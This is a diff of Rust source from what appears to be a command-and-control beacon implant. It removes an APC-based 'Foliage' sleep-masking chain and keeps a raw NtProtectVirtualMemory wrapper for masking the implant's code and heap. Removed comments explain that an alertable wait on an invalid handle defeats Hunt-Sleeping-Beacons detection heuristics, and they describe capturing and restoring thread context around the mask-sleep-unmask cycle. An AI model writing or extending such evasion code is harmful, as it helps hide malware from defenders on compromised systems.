@@ -265,17 +265,12 @@ pub(crate) unsafe fn section_va_len(base: usize, name: &[u8]) -> Option<(usize, 
 /// the beacon thread, copied into the helper's param block). NONE of these go
 /// through the indirect syscall runtime — they call the export directly.
 ///
-/// The beacon thread's REAL handle (not pseudo) is passed separately via
-/// `FoliageParams::beacon_thread_handle` — `NtQueueApcThread` with a
-/// pseudo-handle resolves to the calling thread, NOT the beacon.
+/// Only `nt_protect` remains after the Foliage APC chain was removed (commit
+/// 841ffc5); it is still used by `mem::mask_text_and_heap` /
+/// `mem::unmask_text_and_heap` (dormant, pending Fluctuation wiring).
 #[derive(Clone, Copy)]
 pub struct FoliageRaw {
     nt_protect: usize,
-    nt_wait_for_single_object: usize,
-    nt_queue_apc_thread: usize,
-    nt_get_context_thread: usize,
-    nt_set_context_thread: usize,
-    wait_for_single_object: usize,
 }
 
 impl FoliageRaw {
@@ -294,74 +289,6 @@ impl FoliageRaw {
         type Fn = unsafe extern "system" fn(usize, *mut usize, *mut usize, u32, *mut u32) -> i32;
         let f: Fn = unsafe { core::mem::transmute(self.nt_protect) };
         unsafe { f(0xFFFF_FFFF_FFFF_FFFF, base, size, new_prot, old) }
-    }
-
-    /// Raw NtWaitForSingleObject(Handle, Alertable, Timeout*).
-    /// With `Handle = INVALID_HANDLE_VALUE` (-1) and `Alertable = TRUE`, gives
-    /// wait-reason `UserRequest` instead of `DelayExecution`, defeating
-    /// Hunt-Sleeping-Beacons heuristics. The helper's APC can still wake us.
-    ///
-    /// # Safety
-    /// `timeout` must point at a valid i64 (100ns units, negative = relative).
-    unsafe fn nt_wait_for_single_object(
-        &self,
-        handle: usize,
-        alertable: u8,
-        timeout: usize,
-    ) -> i32 {
-        type Fn = unsafe extern "system" fn(usize, u8, *const i64) -> i32;
-        let f: Fn = unsafe { core::mem::transmute(self.nt_wait_for_single_object) };
-        unsafe { f(handle, alertable, timeout as *const i64) }
-    }
-
-    /// Raw NtQueueApcThread(ThreadHandle, ApcRoutine, Arg1, Arg2, Arg3).
-    ///
-    /// # Safety
-    /// `thread` must be a real thread handle with THREAD_SET_CONTEXT.
-    unsafe fn nt_queue_apc_thread(
-        &self,
-        thread: usize,
-        routine: usize,
-        a1: usize,
-        a2: usize,
-        a3: usize,
-    ) -> i32 {
-        type Fn = unsafe extern "system" fn(usize, usize, usize, usize, usize) -> i32;
-        let f: Fn = unsafe { core::mem::transmute(self.nt_queue_apc_thread) };
-        unsafe { f(thread, routine, a1, a2, a3) }
-    }
-
-    /// Raw WaitForSingleObject(handle, ms).
-    unsafe fn wait_for_single_object(&self, handle: usize, ms: u32) -> u32 {
-        type Fn = unsafe extern "system" fn(usize, u32) -> u32;
-        let f: Fn = unsafe { core::mem::transmute(self.wait_for_single_object) };
-        unsafe { f(handle, ms) }
-    }
-
-    /// Raw NtGetContextThread(ThreadHandle, ContextRecord) — 2 real args.
-    /// Captures the register state of `thread` into `ctx`. Used by the beacon
-    /// thread (before spawning the helper) to snapshot its original CONTEXT.
-    ///
-    /// # Safety
-    /// `ctx` must point at an aligned, writable 1232-byte CONTEXT buffer.
-    unsafe fn nt_get_context_thread(&self, thread: usize, ctx: usize) -> i32 {
-        type Fn = unsafe extern "system" fn(usize, usize) -> i32;
-        let f: Fn = unsafe { core::mem::transmute(self.nt_get_context_thread) };
-        unsafe { f(thread, ctx) }
-    }
-
-    /// Raw NtSetContextThread(ThreadHandle, ContextRecord) — 2 real args.
-    /// Installs `ctx` as the register state of `thread`. Used to restore the
-    /// beacon thread's original CONTEXT after the mask→sleep→unmask cycle.
-    ///
-    /// # Safety
-    /// `ctx` must point at a valid CONTEXT. Only call when the thread is in a
-    /// controlled window (after joining the helper, before the beacon resumes
-    /// normal execution).
-    unsafe fn nt_set_context_thread(&self, thread: usize, ctx: usize) -> i32 {
-        type Fn = unsafe extern "system" fn(usize, usize) -> i32;
-        let f: Fn = unsafe { core::mem::transmute(self.nt_set_context_thread) };
-        unsafe { f(thread, ctx) }
     }
 }
 
